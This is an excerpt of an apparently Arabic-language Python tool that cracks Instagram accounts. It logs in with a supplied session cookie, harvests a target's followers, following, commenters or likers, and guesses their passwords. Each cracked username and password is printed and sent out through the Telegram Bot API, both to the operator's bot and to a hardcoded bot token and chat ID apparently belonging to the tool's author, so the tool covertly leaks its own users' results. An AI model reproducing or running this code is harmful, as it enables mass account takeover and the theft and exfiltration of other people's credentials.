       ...
       try:
           ...
           for yxz in apcb['users']:
               ...
               if xyz not in all_items:
                  ...
                  sys.stdout.write('\r%s%s%s %s%s %sTOTL USERS '%(
...
if wdeh in hind:
 ...
 print('\x1b[38;5;220m ➔ \x1b[38;5;48m تـم ايـقـاف الاداة مـن قـبـل الـمـبـرمـج ᭙ძᥱɦ ᥲᥣᖇ᥆᥉ᥱ')
 print('\x1b[38;5;208m⇼'*60)
 time.sleep(3)
 print('\x1b[38;5;220m ➔ \x1b[38;5;48m @WDEH_ALROSE الـمـبـرمـج ')
 webbrowser.open('https://t.me/wdeh_alrose')
 time.sleep(3)
 print('\x1b[38;5;208m⇼'*60)
 print('\x1b[38;5;220m ➔ \x1b[38;5;48m @YRWSYY قـنـاة الـمـبـرمـج ')
 print('\x1b[38;5;208m⇼'*60)
...
def LoginCookie():
    print(Banner())
    print(f'\n{N}[{H}𝗥َِ𝗼َِ𝘀َِ𝗘🇵🇸🇯🇴{N}] WDEH PYTHON')
    print('')
    cookie = input(f'[{H}?{N}] Cookies : {N}')
    try:
        HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
        ...
        with open('cookie.txt', mode='w', encoding='utf-8') as wr:
           wr.write(f'{cookie}')
        wr.close()
        print('\n%s[%s✓%s] Good Login Username ⊂ %s ⊃ '%(N,H,N,info))
        quit(),MenuCrack()
...
def MenuCrack():
    ...
    try:
          ...
          user = re.search('ds_user_id=(.*?);',str(cookie)).group(1)
    except (FileNotFoundError,AttributeError):LoginCookie()
    try:
          link = requests.get("https://i.instagram.com/api/v1/users/{}/info/".format(user), cookies = {"cookie":cookie}, headers = HEADERS).json()['user']
          nama = link['full_name']
          wing = link['following_count']
          wers = link['follower_count']
    except KeyError:LoginCookie()
    ...
    print(Banner())
    print('\n')
    ulfah(f'''[bold white][[bold green]•[bold white]] Uername  : [bold green]{nama}
...
[bold white][[bold green]•[bold white]] Following : [bold green]{wing}''','color(8)')
    print('''%s
[%s1%s] Crack From Followers : صيد من المتابعين
[%s2%s] Crack From Following : صيد من المتابعهم
[%s3%s] Crack List comments : صيد من التعليقات
[%s4%s] Crack List Likes : صيد من الايكات\n'''%(N,H,N,H,N,H,N,H,N))
    ...
    if main in   ['1','01']:
       ...
       if total is False:exit('\n%s[%s✘%s] erorr cookis | كوكيز عاطل.'%(N,M,N))
       else:crack()
    elif main in ['2','02']:
       target = input('[%s?%s] Target Name : %s'%(H,N,H))
       print('')
...
def apsw(method):
    ...
    print('\n')
    ID=input('\x1b[38;5;220m ID ACCOUNT TELE :\x1b[38;5;153m ')
    token=input(' \x1b[38;5;220mTOKEN BOT TELE : \x1b[38;5;153m')
    with karangjambu:
...
def UserAgent():
    ...
    igve=igv.split(",")
    sev='6303511207:AAFzT7JovMEmAKwGXGwyHZ2bEdik70cmlWA'
    ok='5698088160'
...
def i_insta(username, password):
    ...
    vip = random.choice([a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a20,a21,a22,a23,a24,a25,a26,a27,a28,a29,a30,a31,a32,a34,a35,a36,a27,a38,a39,a40])
    karangjambu.update(purbalingga,description=f'{vip}𝗮َِ𝗟َِ𝗥َِ𝗼َِ𝗦َِ𝗲 {hitung}⇕{len(all_items)} TRUE:[bold green]{success} {vip}SECURE:[bold blue]{checkpoint}')
    ...
    for pw in password:
        try:
            ...
            if 'logged_in_user' in str(response.text):
                 ...
                 followers, following,username = info(wdehok)
                 wdehok=f'''
{BT}{PE}[{PE}•]{CY}password : {PE}{pw}{N}
{BT}{PE}[{PE}•]{CY}Username       : {PE}{username}{N}
{BT}{PE}[{PE}•]{CY}Followers      : {PE}{followers}{N}
{BT}{PE}[{PE}•]{CY}Following      : {PE}{following}{N}
{BT}{PE}[{PE}•]{CY}TOOL BY  : {GN}@WDEH_ALROSE ♱ @YRWSYY{N}'''
                 print(wdehok)
                 statusok1 = nel(wdehok, style='green')
                 cetak(nel(statusok1, title=' WdeH'))
                 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(wdehok))
                 requests.get("https://api.telegram.org/bot"+str(sev)+"/sendMessage?chat_id="+str(ok)+"&text="+str(wdehok))
                 ...
                 checkpoint +=1
                 followers,following,username = info(wdehcp)
                 wdehcp=f'''
{BT}{PE}[{PE}•]{CY}password : {PE}{pw}{N}
{BT}{PE}[{PE}•]{CY}Username       : {PE}{username}{N}
{BT}{PE}[{PE}•]{CY}Followers      : {PE}{followers}{N}
...
{BT}{PE}[{PE}•]{CY}TOOL BY  : {GN}@WDEH_ALROSE ♱ @YRWSYY{N}'''
                 print(wdehcp)
                 statusok1 = nel(wdehcp, style='red')
                 cetak(nel(statusok1, title=' WdeH'))
                 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(wdehcp))
                 requests.get("https://api.telegram.org/bot"+str(sev)+"/sendMessage?chat_id="+str(ok)+"&text="+str(wdehcp))
